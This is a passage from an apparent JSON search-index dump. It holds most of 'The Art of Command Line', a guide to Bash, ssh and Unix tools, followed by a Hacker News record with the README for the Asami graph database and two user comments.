aliases, shell settings, and functions you commonly use in ~/.bashrc, and arrange for login shells to source it. This will make your setup available in all your shell sessions. Put the settings of environment variables as well as commands that should be executed when you login in ~/.bash_profile. Separate configuration will be needed for shells you launch from graphical environment logins and cron jobs. Synchronize your configuration files (e.g. .bashrc and .bash_profile) among various computers with Git. Understand that care is needed when variables and filenames include whitespace. Surround your Bash variables with quotes, e.g. \"$FOO\". Prefer the -0 or -print0 options to enable null characters to delimit filenames, e.g. locate -0 pattern | xargs -0 ls -al or find / -print0 -type d | xargs -0 ls -al. To iterate on filenames containing whitespace in a for loop, set your IFS to be a newline only using IFS=$'\\n'. In Bash scripts, use set -x (or the variant set -v, which logs raw input, including unexpanded variables and comments) for debugging output. Use strict modes unless you have a good reason not to: Use set -e to abort on errors (nonzero exit code). Use set -u to detect unset variable usages. Consider set -o pipefail too, to abort on errors within pipes (though read up on it more if you do, as this topic is a bit subtle). For more involved scripts, also use trap on EXIT or ERR. A useful habit is to start a script like this, which will make it detect and abort on common errors and print a message: set -euo pipefail trap \"echo 'error: Script failed: see failed command above'\" ERR In Bash scripts, subshells (written with parentheses) are convenient ways to group commands. A common example is to temporarily move to a different working directory, e.g. # do something in current dir (cd /some/other/dir && other-command) # continue in original dir In Bash, note there are lots of kinds of variable expansion. Checking a variable exists: ${name:?error message}. For example, if a Bash script requires a single argument, just write input_file=${1:?usage: $0 input_file}. Using a default value if a variable is empty: ${name:-default}. If you want to have an additional (optional) parameter added to the previous example, you can use something like output_file=${2:-logfile}. If $2 is omitted and thus empty, output_file will be set to logfile. Arithmetic expansion: i=$(( (i + 1) % 5 )). Sequences: {1..10}. Trimming of strings: ${var%suffix} and ${var#prefix}. For example if var=foo.pdf, then echo ${var%.pdf}.txt prints foo.txt. Brace expansion using {...} can reduce having to re-type similar text and automate combinations of items. This is helpful in examples like mv foo.{txt,pdf} some-dir (which moves both files), cp somefile{,.bak} (which expands to cp somefile somefile.bak) or mkdir -p test-{a,b,c}/subtest-{1,2,3} (which expands all possible combinations and creates a directory tree). Brace expansion is performed before any other expansion. The order of expansions is: brace expansion; tilde expansion, parameter and variable expansion, arithmetic expansion, and command substitution (done in a left-to-right fashion); word splitting; and filename expansion. (For example, a range like {1..20} cannot be expressed with variables using {$a..$b}. Use seq or a for loop instead, e.g., seq $a $b or for((i=a; i<=b; i++)); do ... ; done.) The output of a command can be treated like a file via <(some command) (known as process substitution). For example, compare local /etc/hosts with a remote one: diff /etc/hosts <(ssh somehost cat /etc/hosts) When writing scripts you may want to put all of your code in curly braces. If the closing brace is missing, your script will be prevented from executing due to a syntax error. This makes sense when your script is going to be downloaded from the web, since it prevents partially downloaded scripts from executing: A \"here document\" allows redirection of multiple lines of input as if from a file: cat <<EOF input on multiple lines EOF In Bash, redirect both standard output and standard error via: some-command >logfile 2>&1 or some-command &>logfile. Often, to ensure a command does not leave an open file handle to standard input, tying it to the terminal you are in, it is also good practice to add </dev/null. Use man ascii for a good ASCII table, with hex and decimal values. For general encoding info, man unicode, man utf-8, and man latin1 are helpful. Use screen or tmux to multiplex the screen, especially useful on remote ssh sessions and to detach and re-attach to a session. byobu can enhance screen or tmux by providing more information and easier management. A more minimal alternative for session persistence only is dtach. In ssh, knowing how to port tunnel with -L or -D (and occasionally -R) is useful, e.g. to access web sites from a remote server. It can be useful to make a few optimizations to your ssh configuration; for example, this ~/.ssh/config contains settings to avoid dropped connections in certain network environments, uses compression (which is helpful with scp over low-bandwidth connections), and multiplex channels to the same server with a local control file: TCPKeepAlive=yes ServerAliveInterval=15 ServerAliveCountMax=6 Compression=yes ControlMaster auto ControlPath /tmp/%r@%h:%p ControlPersist yes A few other options relevant to ssh are security sensitive and should be enabled with care, e.g. per subnet or host or in trusted networks: StrictHostKeyChecking=no, ForwardAgent=yes Consider mosh an alternative to ssh that uses UDP, avoiding dropped connections and adding convenience on the road (requires server-side setup). To get the permissions on a file in octal form, which is useful for system configuration but not available in ls and easy to bungle, use something like stat -c '%A %a %n' /etc/timezone For interactive selection of values from the output of another command, use percol or fzf. For interaction with files based on the output of another command (like git), use fpp (PathPicker). For a simple web server for all files in the current directory (and subdirs), available to anyone on your network, use: python -m SimpleHTTPServer 7777 (for port 7777 and Python 2) and python -m http.server 7777 (for port 7777 and Python 3). For running a command as another user, use sudo. Defaults to running as root; use -u to specify another user. Use -i to login as that user (you will be asked for your password). For switching the shell to another user, use su username or su - username. The latter with \"-\" gets an environment as if another user just logged in. Omitting the username defaults to root. You will be asked for the password of the user you are switching to. Know about the 128K limit on command lines. This \"Argument list too long\" error is common when wildcard matching large numbers of files. (When this happens alternatives like find and xargs may help.) For a basic calculator (and of course access to Python in general), use the python interpreter. For example, Processing files and data To locate a file by name in the current directory, find . -iname '*something*' (or similar). To find a file anywhere by name, use locate something (but bear in mind updatedb may not have indexed recently created files). For general searching through source or data files, there are several options more advanced or faster than grep -r, including (in rough order from older to newer) ack, ag (\"the silver searcher\"), and rg (ripgrep). To convert HTML to text: lynx -dump -stdin For Markdown, HTML, and all kinds of document conversion, try pandoc. For example, to convert a Markdown document to Word format: pandoc README.md --from markdown --to docx -o temp.docx If you must handle XML, xmlstarlet is old but good. For JSON, use jq. For interactive use, also see jid and jiq. For YAML, use shyaml. For Excel or CSV files, csvkit provides in2csv, csvcut, csvjoin, csvgrep, etc. For Amazon S3, s3cmd is convenient and s4cmd is faster. Amazon's aws and the improved saws are essential for other AWS-related tasks. Know about sort and uniq, including uniq's -u and -d options -- see one-liners below. See also comm. Know about cut, paste, and join to manipulate text files. Many people use cut but forget about join. Know about wc to count newlines (-l), characters (-m), words (-w) and bytes (-c). Know about tee to copy from stdin to a file and also to stdout, as in ls -al | tee file.txt. For more complex calculations, including grouping, reversing fields, and statistical calculations, consider datamash. Know that locale affects a lot of command line tools in subtle ways, including sorting order (collation) and performance. Most Linux installations will set LANG or other locale variables to a local setting like US English. But be aware sorting will change if you change locale. And know i18n routines can make sort or other commands run many times slower. In some situations (such as the set operations or uniqueness operations below) you can safely ignore slow i18n routines entirely and use traditional byte-based sort order, using export LC_ALL=C. You can set a specific command's environment by prefixing its invocation with the environment variable settings, as in TZ=Pacific/Fiji date. Know basic awk and sed for simple data munging. See One-liners for examples. To replace all occurrences of a string in place, in one or more files: perl -pi.bak -e 's/old-string/new-string/g' my-files-*.txt To rename multiple files and/or search and replace within files, try repren. (In some cases the rename command also allows multiple renames, but be careful as its functionality is not the same on all Linux distributions.) # Full rename of filenames, directories, and contents foo -> bar: repren --full --preserve-case --from foo --to bar . # Recover backup files whatever.bak -> whatever: repren --renames --from '(.*)\\.bak' --to '\\1' *.bak # Same as above, using rename, if available: rename 's/\\.bak$//' *.bak As the man page says, rsync really is a fast and extraordinarily versatile file copying tool. It's known for synchronizing between machines but is equally useful locally. When security restrictions allow, using rsync instead of scp allows recovery of a transfer without restarting from scratch. It also is among the fastest ways to delete large numbers of files: mkdir empty && rsync -r --delete empty/ some-dir && rmdir some-dir For monitoring progress when processing files, use pv, pycp, pmonitor, progress, rsync --progress, or, for block-level copying, dd status=progress. Use shuf to shuffle or select random lines from a file. Know sort's options. For numbers, use -n, or -h for handling human-readable numbers (e.g. from du -h). Know how keys work (-t and -k). In particular, watch out that you need to write -k1,1 to sort by only the first field; -k1 means sort according to the whole line. Stable sort (sort -s) can be useful. For example, to sort first by field 2, then secondarily by field 1, you can use sort -k1,1 | sort -s -k2,2. If you ever need to write a tab literal in a command line in Bash (e.g. for the -t argument to sort), press ctrl-v [Tab] or write $'\\t' (the latter is better as you can copy/paste it). The standard tools for patching source code are diff and patch. See also diffstat for summary statistics of a diff and sdiff for a side-by-side diff. Note diff -r works for entire directories. Use diff -r tree1 tree2 | diffstat for a summary of changes. Use vimdiff to compare and edit files. For binary files, use hd, hexdump or xxd for simple hex dumps and bvi, hexedit or biew for binary editing. Also for binary files, strings (plus grep, etc.) lets you find bits of text. For binary diffs (delta compression), use xdelta3. To convert text encodings, try iconv. Or uconv for more advanced use; it supports some advanced Unicode things. For example: # Displays hex codes or actual names of characters (useful for debugging): uconv -f utf-8 -t utf-8 -x '::Any-Hex;' < input.txt uconv -f utf-8 -t utf-8 -x '::Any-Name;' < input.txt # Lowercase and removes all accents (by expanding and dropping them): uconv -f utf-8 -t utf-8 -x '::Any-Lower; ::Any-NFD; [:Nonspacing Mark:] >; ::Any-NFC;' < input.txt > output.txt To split files into pieces, see split (to split by size) and csplit (to split by a pattern). Date and time: To get the current date and time in the helpful ISO 8601 format, use date -u +\"%Y-%m-%dT%H:%M:%SZ\" (other options are problematic). To manipulate date and time expressions, use dateadd, datediff, strptime etc. from dateutils. Use zless, zmore, zcat, and zgrep to operate on compressed files. File attributes are settable via chattr and offer a lower-level alternative to file permissions. For example, to protect against accidental file deletion the immutable flag: sudo chattr +i /critical/directory/or/file Use getfacl and setfacl to save and restore file permissions. For example: getfacl -R /some/path > permissions.txt setfacl --restore=permissions.txt To create empty files quickly, use truncate (creates sparse file), fallocate (ext4, xfs, btrfs and ocfs2 filesystems), xfs_mkfile (almost any filesystems, comes in xfsprogs package), mkfile (for Unix-like systems like Solaris, Mac OS). System debugging For web debugging, curl and curl -I are handy, or their wget equivalents, or the more modern httpie. To know current cpu/disk status, the classic tools are top (or the better htop), iostat, and iotop. Use iostat -mxz 15 for basic CPU and detailed per-partition disk stats and performance insight. For network connection details, use netstat and ss. For a quick overview of what's happening on a system, dstat is especially useful. For broadest overview with details, use glances. To know memory status, run and understand the output of free and vmstat. In particular, be aware the \"cached\" value is memory held by the Linux kernel as file cache, so effectively counts toward the \"free\" value. Java system debugging is a different kettle of fish, but a simple trick on Oracle's and some other JVMs is that you can run kill -3 <pid> and a full stack trace and heap summary (including generational garbage collection details, which can be highly informative) will be dumped to stderr/logs. The JDK's jps, jstat, jstack, jmap are useful. SJK tools are more advanced. Use mtr as a better traceroute, to identify network issues. For looking at why a disk is full, ncdu saves time over the usual commands like du -sh *. To find which socket or process is using bandwidth, try iftop or nethogs. The ab tool (comes with Apache) is helpful for quick-and-dirty checking of web server performance. For more complex load testing, try siege. For more serious network debugging, wireshark, tshark, or ngrep. Know about strace and ltrace. These can be helpful if a program is failing, hanging, or crashing, and you don't know why, or if you want to get a general idea of performance. Note the profiling option (-c), and the ability to attach to a running process (-p). Use trace child option (-f) to avoid missing important calls. Know about ldd to check shared libraries etc but never run it on untrusted files. Know how to connect to a running process with gdb and get its stack traces. Use /proc. It's amazingly helpful sometimes when debugging live problems. Examples: /proc/cpuinfo, /proc/meminfo, /proc/cmdline, /proc/xxx/cwd, /proc/xxx/exe, /proc/xxx/fd/, /proc/xxx/smaps (where xxx is the process id or pid). When debugging why something went wrong in the past, sar can be very helpful. It shows historic statistics on CPU, memory, network, etc. For deeper systems and performance analyses, look at stap (SystemTap), perf, and sysdig. Check what OS you're on with uname or uname -a (general Unix/kernel info) or lsb_release -a (Linux distro info). Use dmesg whenever something's acting really funny (it could be hardware or driver issues). If you delete a file and it doesn't free up expected disk space as reported by du, check whether the file is in use by a process: lsof | grep deleted | grep \"filename-of-my-big-file\" One-liners A few examples of piecing together commands: It is remarkably helpful sometimes that you can do set intersection, union, and difference of text files via sort/uniq. Suppose a and b are text files that are already uniqued. This is fast, and works on files of arbitrary size, up to many gigabytes. (Sort is not limited by memory, though you may need to use the -T option if /tmp is on a small root partition.) See also the note about LC_ALL above and sort's -u option (left out for clarity below). sort a b | uniq > c # c is a union b sort a b | uniq -d > c # c is a intersect b sort a b b | uniq -u > c # c is set difference a - b Pretty-print two JSON files, normalizing their syntax, then coloring and paginating the result: diff <(jq --sort-keys . < file1.json) <(jq --sort-keys . < file2.json) | colordiff | less -R Use grep . * to quickly examine the contents of all files in a directory (so each line is paired with the filename), or head -100 * (so each file has a heading). This can be useful for directories filled with config settings like those in /sys, /proc, /etc. Summing all numbers in the third column of a text file (this is probably 3X faster and 3X less code than equivalent Python): awk '{ x += $3 } END { print x }' myfile To see sizes/dates on a tree of files, this is like a recursive ls -l but is easier to read than ls -lR: Say you have a text file, like a web server log, and a certain value that appears on some lines, such as an acct_id parameter that is present in the URL. If you want a tally of how many requests for each acct_id: egrep -o 'acct_id=[0-9]+' access.log | cut -d= -f2 | sort | uniq -c | sort -rn To continuously monitor changes, use watch, e.g. check changes to files in a directory with watch -d -n 2 'ls -rtlh | tail' or to network settings while troubleshooting your wifi settings with watch -d -n 2 ifconfig. Run this function to get a random tip from this document (parses Markdown and extracts an item): function taocl() { curl -s https://raw.githubusercontent.com/jlevy/the-art-of-command-line/master/README.md | sed '/cowsay[.]png/d' | pandoc -f markdown -t html | xmlstarlet fo --html --dropdtd | xmlstarlet sel -t -v \"(html/body/ul/li[count(p)>0])[$RANDOM mod last()+1]\" | xmlstarlet unesc | fmt -80 | iconv -t US } Obscure but useful expr: perform arithmetic or boolean operations or evaluate regular expressions m4: simple macro processor yes: print a string a lot cal: nice calendar env: run a command (useful in scripts) printenv: print out environment variables (useful in debugging and scripts) look: find English words (or lines in a file) beginning with a string cut, paste and join: data manipulation fmt: format text paragraphs pr: format text into pages/columns fold: wrap lines of text column: format text fields into aligned, fixed-width columns or tables expand and unexpand: convert between tabs and spaces nl: add line numbers seq: print numbers bc: calculator factor: factor integers gpg: encrypt and sign files toe: table of terminfo entries nc: network debugging and data transfer socat: socket relay and tcp port forwarder (similar to netcat) slurm: network traffic visualization dd: moving data between files or devices file: identify type of a file tree: display directories and subdirectories as a nesting tree; like ls but recursive stat: file info time: execute and time a command timeout: execute a command for specified amount of time and stop the process when the specified amount of time completes. lockfile: create semaphore file that can only be removed by rm -f logrotate: rotate, compress and mail logs. watch: run a command repeatedly, showing results and/or highlighting changes when-changed: runs any command you specify whenever it sees file changed. See inotifywait and entr as well. tac: print files in reverse comm: compare sorted files line by line strings: extract text from binary files tr: character translation or manipulation iconv or uconv: conversion for text encodings split and csplit: splitting files sponge: read all input before writing it, useful for reading from then writing to the same file, e.g., grep -v something some-file | sponge some-file units: unit conversions and calculations; converts furlongs per fortnight to twips per blink (see also /usr/share/units/definitions.units) apg: generates random passwords xz: high-ratio file compression ldd: dynamic library info nm: symbols from object files ab or wrk: benchmarking web servers strace: system call debugging mtr: better traceroute for network debugging cssh: visual concurrent shell rsync: sync files and folders over SSH or in local file system wireshark and tshark: packet capture and network debugging ngrep: grep for the network layer host and dig: DNS lookups lsof: process file descriptor and socket info dstat: useful system stats glances: high level, multi-subsystem overview iostat: Disk usage stats mpstat: CPU usage stats vmstat: Memory usage stats htop: improved version of top last: login history w: who's logged on id: user/group identity info sar: historic system stats iftop or nethogs: network utilization by socket or process ss: socket statistics dmesg: boot and system error messages sysctl: view and configure Linux kernel parameters at run time hdparm: SATA/ATA disk manipulation/performance lsblk: list block devices: a tree view of your disks and disk partitions lshw, lscpu, lspci, lsusb, dmidecode: hardware information, including CPU, BIOS, RAID, graphics, devices, etc. lsmod and modinfo: List and show details of kernel modules. fortune, ddate, and sl: um, well, it depends on whether you consider steam locomotives and Zippy quotations \"useful\" macOS only These are items relevant only on macOS. Package management with brew (Homebrew) and/or port (MacPorts). These can be used to install on macOS many of the above commands. Copy output of any command to a desktop app with pbcopy and paste input from one with pbpaste. To enable the Option key in macOS Terminal as an alt key (such as used in the commands above like alt-b, alt-f, etc.), open Preferences -> Profiles -> Keyboard and select \"Use Option as Meta key\". To open a file with a desktop app, use open or open -a /Applications/Whatever.app. Spotlight: Search files with mdfind and list metadata (such as photo EXIF info) with mdls. Be aware macOS is based on BSD Unix, and many commands (for example ps, ls, tail, awk, sed) have many subtle variations from Linux, which is largely influenced by System V-style Unix and GNU tools. You can often tell the difference by noting a man page has the heading \"BSD General Commands Manual.\" In some cases GNU versions can be installed, too (such as gawk and gsed for GNU awk and sed). If writing cross-platform Bash scripts, avoid such commands (for example, consider Python or perl) or test carefully. To get macOS release information, use sw_vers. Windows only These items are relevant only on Windows. Ways to obtain Unix tools under Windows Access the power of the Unix shell under Microsoft Windows by installing Cygwin. Most of the things described in this document will work out of the box. On Windows 10, you can use Windows Subsystem for Linux (WSL), which provides a familiar Bash environment with Unix command line utilities. If you mainly want to use GNU developer tools (such as GCC) on Windows, consider MinGW and its MSYS package, which provides utilities such as bash, gawk, make and grep. MSYS doesn't have all the features compared to Cygwin. MinGW is particularly useful for creating native Windows ports of Unix tools. Another option to get Unix look and feel under Windows is Cash. Note that only very few Unix commands and command-line options are available in this environment. Useful Windows command-line tools You can perform and script most Windows system administration tasks from the command line by learning and using wmic. Native command-line Windows networking tools you may find useful include ping, ipconfig, tracert, and netstat. You can perform many useful Windows tasks by invoking the Rundll32 command. Cygwin tips and tricks Install additional Unix programs with the Cygwin's package manager. Use mintty as your command-line window. Access the Windows clipboard through /dev/clipboard. Run cygstart to open an arbitrary file through its registered application. Access the Windows registry with regtool. Note that a C:\\ Windows drive path becomes /cygdrive/c under Cygwin, and that Cygwin's / appears under C:\\cygwin on Windows. Convert between Cygwin and Windows-style file paths with cygpath. This is most useful in scripts that invoke Windows programs. More resources awesome-shell: A curated list of shell tools and resources. awesome-osx-command-line: A more in-depth guide for the macOS command line. Strict mode for writing better shell scripts. shellcheck: A shell script static analysis tool. Essentially, lint for bash/sh/zsh. Filenames and Pathnames in Shell: The sadly complex minutiae on how to handle filenames correctly in shell scripts. Data Science at the Command Line: More commands and tools helpful for doing data science, from the book of the same name Disclaimer With the exception of very small tasks, code is written so others can read it. With power comes responsibility. The fact you can do something in Bash doesn't necessarily mean you should! ;) License This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License. ",
        "_version_": 1718527405713260544
      },
      {
        "story_id": [19238277],
        "story_author": ["tosh"],
        "story_descendants": [8],
        "story_score": [71],
        "story_time": ["2019-02-24T12:09:20Z"],
        "story_title": "Asami: Datomic-Like Graph Database",
        "search": [
          "Asami: Datomic-Like Graph Database",
          "https://github.com/threatgrid/asami/blob/master/README.md",
          "asami A graph database, for Clojure and ClojureScript. The latest version is : Asami is a schemaless database, meaning that data may be inserted with no predefined schema. This flexibility has advantages and disadvantages. It is easier to load and evolve data over time without a schema. However, functionality like upsert and basic integrity checking is not available in the same way as with a graph with a predefined schema. Asami also follows an Open World Assumption model, in the same way that RDF does. In practice, this has very little effect on the database, beyond what being schemaless provides. If you are new to graph databases, then please read our Introduction page. Asami has a query API that looks very similar to a simplified Datomic. More details are available in the Query documentation. Features There are several other graph databases available in the Clojure ecosystem, with each having their own focus. Asami is characterized by the following: Clojure and ClojureScript: Asami runs identically in both systems. Schema-less: Asami does not require a schema to insert data. Query planner: Queries are analyzed to find an efficient execution plan. This can be turned off. Analytics: Supports fast graph traversal operations, such as transitive closures, and can identify subgraphs. Integrated with Loom: Asami graphs are valid Loom graphs, via Asami-Loom. Open World Assumption: Related to being schema-less, Asami borrows semantics from RDF to lean towards an open world model. Pluggable Storage: Like Datomic, storage in Asami can be implemented in multiple ways. There are currently 2 in-memory graph systems, and durable storage available on the JVM. Usage Installing Using Asami requires Clojure or ClojureScript. Asami can be made available to clojure by adding the following to a deps.edn file: { :deps { org.clojars.quoll/asami {:mvn/version \"2.2.2\"} } } This makes Asami available to a repl that is launched with the clj or clojure commands. Alternatively, Asami can be added for the Leiningen build tool by adding this to the :dependencies section of the project.clj file: [org.clojars.quoll/asami \"2.2.2\"] Important Note for databases before 2.1.0 Asami 2.1.0 now uses fewer files to manage data. This makes it incompatible with previous versions. To port data from an older store to a new one, use the asami.core/export-data function on a database on the previous version of Asami, and asami.core/import-data to load the data into a new connection. Running The Asami API tries to look a little like Datomic. Once a repl has been configured for Asami, the following can be copy/pasted to test the API: (require '[asami.core :as d]) ;; Create an in-memory database, named dbname (def db-uri \"asami:mem://dbname\") (d/create-database db-uri) ;; Create a connection to the database (def conn (d/connect db-uri)) ;; Data can be loaded into a database either as objects, or \"add\" statements: (def first-movies [{:movie/title \"Explorers\" :movie/genre \"adventure/comedy/family\" :movie/release-year 1985} {:movie/title \"Demolition Man\" :movie/genre \"action/sci-fi/thriller\" :movie/release-year 1993} {:movie/title \"Johnny Mnemonic\" :movie/genre \"cyber-punk/action\" :movie/release-year 1995} {:movie/title \"Toy Story\" :movie/genre \"animation/adventure\" :movie/release-year 1995}]) @(d/transact conn {:tx-data first-movies}) The transact operation returns an object that can be dereferenced (via clojure.core/deref or the @ macro) to provide information about the state of the database before and after the transaction. (A future in Clojure, or a delay in ClojureScript). Note that the transaction data can be provided as the :tx-data in a map object if other parameters are to be provided, or just as a raw sequence without the wrapping map. For more information about loading data and executing transact see the Transactions documentation. With the data loaded, a database value can be retrieved from the database and then queried. NB: The transact operation will be executed asynchronously on the JVM. Retrieving a database immediately after executing a transact will not retrieve the latest database. If the updated database is needed, then perform the deref operation as shown above, since this will wait until the operation is complete. (def db (d/db conn)) (d/q '[:find ?movie-title :where [?m :movie/title ?movie-title]] db) This returns a sequence of results, with each result being a sequence of the selected vars in the :find clause (just ?movie-title in this case): ([\"Explorers\"] [\"Demolition Man\"] [\"Johnny Mnemonic\"] [\"Toy Story\"]) A more complex query could be to get the title, year and genre for all movies after 1990: (d/q '[:find ?title ?year ?genre :where [?m :movie/title ?title] [?m :movie/release-year ?year] [?m :movie/genre ?genre] [(> ?year 1990)]] db) Entities found in a query can be extracted back out as objects using the entity function. For instance, the following is a repl session that looks up the movies released in 1995, and then gets the associated entities: ;; find the entity IDs. This variation in the :find clause asks for a list of just the ?m variable => (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db) (:tg/node-10327 :tg/node-10326) ;; get a single entity => (d/entity db :tg/node-10327) #:movie{:title \"Toy Story\", :genre \"animation/adventure\", :release-year 1995} ;; get all the entities from the query => (map #(d/entity db %) (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db)) (#:movie{:title \"Toy Story\", :genre \"animation/adventure\", :release-year 1995} #:movie{:title \"Johnny Mnemonic\", :genre \"cyber-punk/action\", :release-year 1995}) See the Query Documentation for more information on querying. Refer to the Entity Structure documentation to understand how entities are stored and how to construct queries for them. Local Storage The above code uses an in-memory database, specified with a URL of the form asami:mem://dbname. Creating a database on disk is done the same way, but with the URL scheme changed to asami:local://dbname. This would create a database in the dbname directory. Local databases do not use keywords as entity IDs, as keywords use up memory, and a local database could be gigabytes in size. Instead, these are InternalNode objects. These can be created with asami.graph/new-node, or by using the readers in asami.graph. For instance, if the above code were all done with a local graph instead of a memory graph: => (d/q '[:find [?m ...] :where [?m :movie/release-year 1995]] db) (#a/n \"3\" #a/n \"4\") ;; get a single entity => (require '[asami.graph :as graph]) => (d/entity db (graph/new-node 4)) #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} ;; nodes can also be read from a string, with the appropriate reader => (set! *data-readers* graph/node-reader) => (d/entity db #a/n \"4\") #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} Updates The Open World Assumption allows each attribute to be multi-arity. In a Closed World database an object may be loaded to replace those attributes that can only appear once. To do the same thing with Asami, annotate the attributes to be replaced with a quote character at the end of the attribute name. => (def toy-story (d/q '[:find ?ts . :where [?ts :movie/title \"Toy Story\"]] db)) => (d/transact conn [{:db/id toy-story :movie/genre' \"animation/adventure/comedy\"}]) => (d/entity (d/db conn) toy-story) #:movie{:title \"Toy Story\", :genre \"animation/adventure/comedy\", :release-year 1995} Addressing nodes by their internal ID can be cumbersome. They can also be addressed by a :db/ident field if one is provided. (def tx (d/transact conn [{:db/ident \"sense\" :movie/title \"Sense and Sensibility\" :movie/genre \"drama/romance\" :movie/release-year 1996}])) ;; ask the transaction for the node ID, instead of querying (def sense (get (:tempids @tx) \"sense\")) (d/entity (d/db conn) sense) This returns the new movie. The :db/ident attribute does not appear in the entity: #:movie{:title \"Sense and Sensibility\", :genre \"drama/romance\", :release-year 1996} However, all of the attributes are still present in the graph: => (d/q '[:find ?a ?v :in $ ?s :where [?s ?a ?v]] (d/db conn) sense) ([:db/ident \"sense\"] [:movie/title \"Sense and Sensibility\"] [:movie/genre \"drama/romance\"] [:movie/release-year 1996]) The release year of this movie is incorrectly set to the release in the USA, and not the initial release. That can be updated using the :db/ident field: => (d/transact conn [{:db/ident \"sense\" :movie/release-year' 1995}]) => (d/entity (d/db conn) sense) #:movie{:title \"Sense and Sensibility\", :genre \"drama/romance\", :release-year 1995} More details are provided in Entity Updates. Analytics Asami also has some support for graph analytics. These all operate on the graph part of a database value, which can be retrieved with the asami.core/graph function. NB: local graphs on disk are not yet supported. These will be available soon. Start by populating a graph with the cast of \"The Flintstones\". So that we can refer to entities after they have been created, we can provide them with temporary ID values. These are just negative numbers, and can be used elsewhere in the transaction to refer to the same entity. We will also avoid the :tx-data wrapper in the transaction: (require '[asami.core :as d]) (require '[asami.analytics :as aa]) (def db-uri \"asami:mem://data\") (d/create-database db-uri) (def conn (d/connect db-uri)) (def data [{:db/id -1 :name \"Fred\"} {:db/id -2 :name \"Wilma\"} {:db/id -3 :name \"Pebbles\"} {:db/id -4 :name \"Dino\" :species \"Dinosaur\"} {:db/id -5 :name \"Barney\"} {:db/id -6 :name \"Betty\"} {:db/id -7 :name \"Bamm-Bamm\"} [:db/add -1 :spouse -2] [:db/add -2 :spouse -1] [:db/add -1 :child -3] [:db/add -2 :child -3] [:db/add -1 :pet -4] [:db/add -5 :spouse -6] [:db/add -6 :spouse -5] [:db/add -5 :child -7] [:db/add -6 :child -7]]) (d/transact conn data) Fred, Wilma, Pebbles, and Dino are all connected in a subgraph. Barney, Betty and Bamm-Bamm are connected in a separate subgraph. Let's find the subgraph from Fred: (def db (d/db conn)) (def graph (d/graph db)) (def fred (d/q '[:find ?e . :where [?e :name \"Fred\"]] db)) (aa/subgraph-from-node graph fred) This returns the nodes in the graph, but not the scalar values. For instance: #{:tg/node-10330 :tg/node-10329 :tg/node-10331 :tg/node-10332} These nodes can be used as the input to a query to get their names: => (d/q '[:find [?name ...] :in $ [?n ...] :where [?n :name ?name]] db (aa/subgraph-from-node graph fred)) (\"Fred\" \"Pebbles\" \"Dino\" \"Wilma\") We can also get all the subgraphs: => (count (aa/subgraphs graph)) 2 ;; execute the same query for each subgraph => (map (partial d/q '[:find [?name ...] :where [?e :name ?name]]) (aa/subgraphs graph)) ((\"Fred\" \"Wilma\" \"Pebbles\" \"Dino\") (\"Barney\" \"Betty\" \"Bamm-Bamm\")) Transitive Queries Asami supports transitive properties in queries. A property (or attribute) is treated as transitive if it is followed by a + or a * character. (d/q '[:find ?friend-of-a-friend :where [?person :name \"Fred\"] [?person :friend+ ?foaf] [?foaf :name ?friend-of-a-friend]] db) This will find all friends, and friends of friends for Fred. Loom Asami also implements Loom via the Asami-Loom package. Include the following dependency for your project: [org.clojars.quoll/asami-loom \"0.2.0\"] Graphs can now be analyzed with Loom functions. If functions are provided to Loom, then they can be used to provide labels for creating a visual graph. The following creates some simple queries to get the labels for edges and nodes: (require '[asami-loom.index]) (require '[asami-loom.label]) (require '[loom.io]) (defn edge-label [g s d] (str (d/q '[:find ?e . :in $ ?a ?b :where (or [?a ?e ?b] [?b ?e ?a])] g s d))) (defn node-label [g n] (or (d/q '[:find ?name . :where [?n :name ?name]] g n) \"-\")) ;; create a PDF of the graph (loom-io/view (graph db) :fmt :pdg :alg :sfpd :edge-label edge-label :node-label node-label) Command Line Tool A command line tool is available to load data into an Asami graph and query it. This requires GraalVM CE 21.1.0 or later, and the native-image executable. Leiningen needs to see GraalVM on the classpath first, so if there are problems with building, check to see if this is the case. To build from sources: lein with-profile native uberjar lein with-profile native native This will create a binary called asami in the target directory. Execute with the -? flag for help: $ ./target/asami -? Usage: asami URL [-f filename] [-e query] [--help | -?] -? | --help: This help URL: the URL of the database to use. Must start with asami:mem://, asami:multi:// or asami:local:// -f filename: loads the filename into the database. A filename of \"-\" will use stdin. Data defaults to EDN. Filenames ending in .json are treated as JSON. -e query: executes a query. \"-\" (the default) will read from stdin instead of a command line argument. Multiple queries can be specified as edn (vector of query vectors) or ; separated. Available EDN readers: internal nodes - #a/n \"node-id\" regex - #a/r \"[Tt]his is a (regex|regular expression)\" Example: Loading a json file, and querying for keys (attributes) that are strings with spaces in them: asami asami:mem://tmp -f data.json -e ':find ?a :where [?e ?a ?v][(string? ?a)][(re-find #a/r \" \" ?a)]' The command will also work on local stores, which means that they can be loaded once and then queried multiple times. License Copyright 2016-2021 Cisco Systems Copyright 2015-2021 Paula Gearon Portions of src/asami/cache.cljc are Copyright Rich Hickey Distributed under the Eclipse Public License either version 1.0 or (at your option) any later version. ",
          "Ah neat -- We're always looking for new graph databases to connect Graphistry to!<p>Any guidance on wire protocol (BOLT, TinkerPop, some custom HTTP, ...?) + early users? Guessing ThreatGrid..",
          "For CRUD stuff I have found datomic to be hard to maintain if your domain demands lots of attributes (even if trying to be as generic as possible), you need discipline (good docs) and lots of application code for checks and to force constraints. In sql/rdbms world you have all the atrributes nicely organized(within tables) with good check/constraints available at hand (waits for easy vs simple comment).<p>With datomic you get fleixble schema but at a high cost IMO."
        ],
        "story_type": ["Normal"],
        "url": "https://github.com/threatgrid/asami/blob/master/README.md",
        "comments.comment_id": [19239013, 19239827],
        "comments.comment_author": ["lmeyerov", "Scarbutt"],
        "comments.comment_descendants": [0, 2],
        "comments.comment_time": [
          "2019-02-24T15:53:16Z",
          "2019-02-24T18:30:57Z"
        ],
        "comments.comment_text": [
          "Ah neat -- We're always looking for new graph databases to connect Graphistry to!<p>Any guidance on wire protocol (BOLT, TinkerPop, some custom HTTP, ...?) + early users? Guessing ThreatGrid..",
          "For CRUD stuff I have found datomic to be hard to maintain if your domain demands lots of attributes (even if trying to be as generic as possible), you need discipline (good docs) and lots of application code for checks and to force constraints. In sql/rdbms world you have all the atrributes nicely organized(within tables) with good check/constraints available at hand (waits for easy vs simple comment).<p>With datomic you get fleixble schema but at a high cost IMO."
